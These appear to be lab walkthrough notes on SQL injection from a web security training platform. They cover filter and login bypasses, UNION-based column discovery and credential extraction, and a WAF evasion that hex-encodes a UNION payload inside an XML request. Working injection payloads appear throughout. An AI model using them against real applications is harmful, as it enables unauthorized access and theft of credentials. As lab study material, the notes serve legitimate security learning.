## 01. SQLi in WHERE clause (Retrieving Hidden Data)

**Difficulty:** Apprentice

**Goal:** Display unreleased products by manipulating the category filter.

### Analysis

The application performs a query like:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

### Execution

1. Access the lab and click a category (e.g., `Gifts`).
    
2. In the URL, change the category parameter to:
    
    `category=Gifts' OR 1=1--`
    
3. **Why it works:**
    
    - The `'` closes the Gifts string.
        
    - `OR 1=1` makes the condition always true.
        
    - `--` comments out the rest of the query (`AND released = 1`), forcing the database to return every product in the table.
        

---

## 02. SQLi Login Bypass

**Difficulty:** Apprentice

**Goal:** Log in as the `administrator` user without knowing the password.

### Analysis

The query likely looks like:

`SELECT * FROM users WHERE username = 'user' AND password = 'password'`

### Execution

1. Go to the login page.
    
2. Enter the following as the username: `administrator'--`
    
3. Enter any random text for the password.
    
4. **Why it works:**
    
    - The query becomes: `SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'`
        
    - Everything after the `--` is ignored, effectively removing the password check.
        

---

## 03. UNION Attack: Determining Column Count

**Difficulty:** Practitioner

**Goal:** Find out how many columns are being returned by the original query.

### Analysis

To use a `UNION` attack, your injected query must have the **exact same number of columns** as the original.

### Execution

1. Append `ORDER BY` to the parameter and increment the number until you get an error:
    
    - `'+ORDER+BY+1--` (Success)
        
    - `'+ORDER+BY+2--` (Success)
        
    - `'+ORDER+BY+3--` (Error! The page breaks)
        
2. **Conclusion:** If `ORDER BY 3` fails but `2` works, the table has **2 columns**.
    

---

## 04. UNION Attack: Finding Text Columns

**Difficulty:** Practitioner

**Goal:** Find which column can hold string data (so you can display usernames/passwords).

### Execution

1. Use the column count from the previous lab (let's assume it's 3).
    
2. Inject a random string into each column one by one:
    
    - `' UNION SELECT 'abc', NULL, NULL--`
        
    - `' UNION SELECT NULL, 'abc', NULL--`
        
3. When the page displays your string `'abc'`, you’ve found a text-compatible column.
    

---

## 05. UNION Attack: Retrieving Data from Other Tables

**Difficulty:** Practitioner

**Goal:** Steal the administrator's password from the `users` table.

### Execution

1. Use the previous labs to find that there are 2 columns and both take text.
    
2. Inject a payload to pull from the `users` table:
    
    `' UNION SELECT username, password FROM users--`
    
3. Find the `administrator` credentials in the list of products displayed on the page.
    

---

### 💡 Quick Cheat Sheet for Obsidian

|**DB Type**|**Version Command**|**Comment Syntax**|
|---|---|---|
|**MySQL**|`SELECT @@version`|`#` or `--` (space after)|
|**PostgreSQL**|`SELECT version()`|`--`|
|**Oracle**|`SELECT banner FROM v$version`|`--`|
|**MS SQL**|`SELECT @@version`|`--`|
## Step-by-Step Walkthrough

### Step A: Find the String Column

First, confirm which column displays text. `' UNION SELECT 'abc', NULL--` (Error) `' UNION SELECT NULL, 'abc'--` (Success - Column 2 is our target)

### Step B: Craft the Concatenation (PostgreSQL Example)

We want to grab the credentials from the `users` table. We use a separator like `~` or `:` to make it easy to read.

**Payload:** `' UNION SELECT NULL, username || ':' || password FROM users--`

### Step C: Extract the Data

The page will now render the data in that single column like this:

- `administrator:p4ssw0rd`
    
- `carlos:qwerty`
    
- `wiener:peter`
    

You can now copy the password for the `administrator` and log in.

# 🏆 Lab: SQLi with Filter Bypass via XML Encoding

## 🎯 Objective

Exploit a hidden SQL injection vulnerability in a "Check Stock" feature that is protected by a WAF (Web Application Firewall) that blocks standard SQL keywords.

## 🛠️ The Solution Walkthrough

### 1. Intercept the Request

When clicking "Check Stock," the original request is sent as a standard POST form:

- **Header:** `Content-Type: application/x-www-form-urlencoded`
    
- **Body:** `productId=1&storeId=1`
    

### 2. Bypass Phase 1: Content-Type Switching

The server's WAF is tuned to watch for SQLi in standard form parameters. To bypass this, we manually change the request format to **XML**, which the backend also supports but the WAF inspects less strictly.

- **New Header:** `Content-Type: application/xml`
    
- **New Body:**
    
    XML
    
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>
    ```
    

### 3. Bypass Phase 2: Hex Entity Encoding

Even in XML, the WAF will block words like `UNION` or `SELECT`. To hide these, we encode the entire SQL payload into **XML Hex Entities**.

- **Raw SQL:** `1 UNION SELECT username || '~' || password FROM users`
    
- **Encoded for XML:** `1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;...` (and so on)
    

### 4. Final Payload Injection

Replace the value inside the `<storeId>` tag with the encoded payload:

XML

```
POST /product/stock HTTP/2
Host: [LAB-ID].web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</stockCheck>
```

## 🚩 Result

The XML parser decodes the entities _after_ the WAF check, executing the query and returning the credentials: **`administrator:p4ssw0rd`**

---

### 💡 Why this worked for you

1. **Context Switching:** You moved the attack from a "high-security" context (Form data) to a "low-security" context (XML).
    
2. **Obfuscation:** You used Hex to ensure the WAF didn't see a single readable SQL keyword.